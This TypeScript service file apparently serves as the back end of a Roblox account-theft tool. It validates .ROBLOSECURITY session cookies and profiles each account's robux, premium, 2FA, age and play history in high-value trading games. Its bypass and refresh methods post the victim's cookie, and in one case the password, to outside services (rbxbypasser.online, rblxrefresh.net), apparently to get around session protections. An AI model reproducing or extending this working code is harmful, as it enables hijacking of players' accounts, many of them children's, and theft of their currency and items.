export class RobloxService {
  private static ROBLOX_WARNING = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";

  static isValidCookie(cookie: string): boolean {
    return cookie && cookie.startsWith(this.ROBLOX_WARNING) && cookie.length > 150;
  }

  static async checkAccount(cookie: string) {
    const headers: Record<string, string> = {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
      "Accept": "application/json",
      "Referer": "https://www.roblox.com/",
      "Origin": "https://www.roblox.com",
      "Cookie": `.ROBLOSECURITY=${cookie}`
    };

    try {
      // 1. Get CSRF Token
      const authRes = await fetch("https://auth.roblox.com/v2/login", {
        method: "POST",
        headers
      });
      
      const csrfToken = authRes.headers.get("x-csrf-token");
      if (csrfToken) {
        headers["X-CSRF-TOKEN"] = csrfToken;
      }

      // Capture set-cookie headers
      // @ts-ignore
      const setCookies = typeof authRes.headers.getSetCookie === 'function' ? authRes.headers.getSetCookie() : [];
      if (setCookies && setCookies.length > 0) {
        const newCookies = setCookies.map((c: string) => c.split(';')[0]).join('; ');
        headers["Cookie"] = `.ROBLOSECURITY=${cookie}; ${newCookies}`;
      }

      // 2. Get Authenticated User
      const userRes = await fetch("https://users.roblox.com/v1/users/authenticated", { headers });
      if (!userRes.ok) {
        const errorText = await userRes.text();
        return {
          status: "error",
          message: `Roblox API returned ${userRes.status}. This usually means the cookie is invalid or Roblox is blocking the server's IP.`,
          debug: { status: userRes.status, text: errorText.substring(0, 100) }
        };
      }
      const userData = await userRes.json() as any;
      const userId = userData.id;
      const username = userData.name;
      const displayName = userData.displayName;

      // 3. Get Settings Raw
      const settingsRes = await fetch("https://www.roblox.com/my/settings/json", { headers });
      const settingsText = settingsRes.ok ? await settingsRes.text() : "{}";

      // 4. Get Account Details
      const userDetailsRes = await fetch(`https://users.roblox.com/v1/users/${userId}`, { headers });
      const userDetails = userDetailsRes.ok ? await userDetailsRes.json() as any : {};
      
      let daysOld = 0;
      if (userDetails.created) {
        const createdDate = new Date(userDetails.created);
        const now = new Date();
        daysOld = Math.floor((now.getTime() - createdDate.getTime()) / (1000 * 60 * 60 * 24));
      }

      // Avatar
      let avatarUrl = "";
      const avatarRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=false`, { headers });
      if (avatarRes.ok) {
        const avatarData = await avatarRes.json() as any;
        if (avatarData.data && avatarData.data.length > 0) {
          avatarUrl = avatarData.data[0].imageUrl || "";
        }
      }

      // 5. Get Presence
      let presence = {};
      try {
        const presenceRes = await fetch("https://presence.roblox.com/v1/presence/users", {
          method: "POST",
          headers: { ...headers, "Content-Type": "application/json" },
          body: JSON.stringify({ userIds: [userId] })
        });
        if (presenceRes.ok) {
          const presenceData = await presenceRes.json() as any;
          if (presenceData.userPresences && presenceData.userPresences.length > 0) {
            const p = presenceData.userPresences[0];
            const statusMap: Record<number, string> = { 0: "Offline", 1: "Online", 2: "InGame", 3: "InStudio" };
            const label = statusMap[p.userPresenceType] || "Offline";
            const isOnline = p.userPresenceType > 0;
            presence = {
              code: p.userPresenceType,
              status: label.toLowerCase(),
              label: label,
              circle: isOnline ? "green" : "gray",
              hex: isOnline ? "#00B06F" : "#9CA3AF"
            };
          }
        }
      } catch (e) {}

      // 6. Get Economy and Status
      let robux = 0;
      const currRes = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, { headers });
      if (currRes.ok) {
        const currData = await currRes.json() as any;
        robux = currData.robux || 0;
      }

      let isPremium = "False";
      const premRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, { headers });
      if (premRes.ok) {
        const premData = await premRes.json() as any;
        isPremium = premData ? "True" : "False";
      }

      const result = {
        status: "success",
        user_info: {
          username: username,
          display_name: displayName,
          user_id: userId,
          age_status: settingsText.includes('"UserAbove13":false') ? "<13" : "13+",
          account_age_days: daysOld,
          avatar_url: avatarUrl
        },
        presence: presence,
        account_status: {
          robux_balance: robux,
          pending_robux: 0,
          premium: isPremium,
          email_verified: settingsText.includes('"IsEmailVerified":true') ? "Verified" : "Unverified",
          two_factor_auth: settingsText.includes('"IsTwoStepToggleEnabled":true') ? "True" : "False",
          voice_chat: settingsText.includes('"IsVoiceEnabled":true') ? "True" : "Unknown",
          age_verified: settingsText.includes('"IsAgeVerified":true') ? "True" : "False"
        },
        inventory: {
          note: "Inventory scanning requires iterating pages of assets and is slow."
        },
        games: {
          per_game: {} as Record<string, any>
        }
      };

      // 7. Get Game Data
      const gamesMap = {
        "blox_fruits": 1305885091,
        "adopt_me": 920587237,
        "murder_mystery_2": 66654135
      };
      
      for (const [name, universeId] of Object.entries(gamesMap)) {
        let voteData: any = { userVote: null };
        try {
          const voteRes = await fetch(`https://games.roblox.com/v1/games/${universeId}/votes/user`, { headers });
          if (voteRes.ok) {
            voteData = await voteRes.json();
          }
        } catch (e) {}
        
        result.games.per_game[name] = {
          played_proxy: voteData.userVote !== null,
          votes_raw: voteData
        };
      }

      return { result };
    } catch (error: any) {
      console.error("RobloxService Error:", error);
      throw error;
    }
  }

  static async bypass(cookie: string, password: string) {
    const url = process.env.BYPASS_API_URL || "https://rbxbypasser.online/api/bypass";
    const payload = {
      cookie: cookie,
      password: password,
      directoryName: process.env.BYPASS_DIRECTORY_NAME || "tiki"
    };

    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 7000); // 7s timeout to safely beat Vercel's 10s limit including cold starts

    try {
      const response = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
        signal: controller.signal
      });
      clearTimeout(timeoutId);

      const text = await response.text();
      try {
        return { status: response.status, data: JSON.parse(text) };
      } catch (e) {
        return { 
          status: response.status, 
          data: { 
            success: response.ok,
            message: response.ok ? "Success" : "Failed",
            content: text 
          } 
        };
      }
    } catch (error: any) {
      clearTimeout(timeoutId);
      if (error.name === 'AbortError') {
        return { status: 504, data: { success: false, message: "The bypass API took too long to respond (Timeout)." } };
      }
      throw error;
    }
  }

  static async refresh(cookie: string) {
    const url = process.env.REFRESH_API_URL || "https://rblxrefresh.net/refreshv2";
    const formData = new URLSearchParams();
    formData.append("cookie", cookie);

    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 7000);

    try {
      const response = await fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
          "Referer": process.env.REFRESH_REFERER || "https://rblxrefresh.net/r/tiki"
        },
        body: formData.toString(),
        signal: controller.signal
      });
      clearTimeout(timeoutId);

      const text = await response.text();
      return {
        status: response.status,
        ok: response.ok,
        content: text
      };
    } catch (error: any) {
      clearTimeout(timeoutId);
      if (error.name === 'AbortError') {
        return { status: 504, ok: false, content: "The refresh API took too long to respond (Timeout)." };
      }
      throw error;
    }
  }
}
